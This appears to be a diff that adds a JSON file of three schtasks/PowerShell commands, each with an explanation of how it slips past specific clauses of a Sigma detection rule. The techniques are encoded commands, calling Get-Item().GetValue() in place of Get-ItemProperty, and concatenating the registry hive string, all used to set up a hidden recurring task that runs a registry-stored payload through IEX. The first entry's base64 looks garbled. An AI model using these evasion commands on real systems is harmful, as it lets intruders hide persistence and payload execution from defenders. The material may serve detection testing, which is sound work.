@@ -1,0 +1,14 @@
+[
+  {
+    "output": "schtasks.exe /Create /TN \"BypassTask\" /TR \"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand JABwAHkAcwB0AGUAbQAuAEQAYQB0AGEgAEMAbwBkAGUAKAAnAEMAbwBkAGUAnAApACAAIABzAHQAYQByAHQAIABwAHIAbwBjAGUAcwBzACAAJABzAHQAYQByAHQAIAAnAEMAbwBkAGUAnAApACAA\" /SC MINUTE /MO 30",
+    "explanation": "The command uses schtasks.exe with /Create to create a scheduled task. The PowerShell command includes the -EncodedCommand parameter, which triggers the filter_main_encoding clause (contains 'encodedcommand'). Because the rule's condition requires that none of the filter clauses match, the presence of -EncodedCommand causes the rule to evaluate to false, thus bypassing detection. The command does not rely on Get-ItemProperty or explicit registry hive strings, further avoiding the selection clauses."
+  },
+  {
+    "output": "schtasks.exe /Create /F /TN \"SystemUpdater\" /TR \"powershell.exe -WindowStyle Hidden -Command IEX((Get-Item 'HKCU:\\Software\\PayloadKey').GetValue('PayloadValue'))\" /SC MINUTE /MO 30",
+    "explanation": "Bypasses the 'selection_cli_get' condition. The Sigma rule statically matches the 'Get-ItemProperty' cmdlet or the ' gp ' alias. By using 'Get-Item' to retrieve the registry key object and invoking the '.GetValue()' method, the payload is extracted from the registry without triggering the specific string matches defined in the rule."
+  },
+  {
+    "output": "schtasks.exe /Create /F /TN \"SystemUpdater\" /TR \"powershell.exe -WindowStyle Hidden -Command IEX(Get-ItemProperty ('H'+'KCU:\\Software\\PayloadKey')).PayloadValue\" /SC MINUTE /MO 30",
+    "explanation": "Bypasses the 'selection_cli_hive' condition. The rule relies on literal string detections for registry hives (e.g., 'HKCU:', 'HKLM:', 'HKEY_'). By obfuscating the hive prefix via simple string concatenation ('H'+'KCU:'), the command avoids the static signature in the process command line logs while still being correctly parsed and executed by PowerShell."
+  }
+]
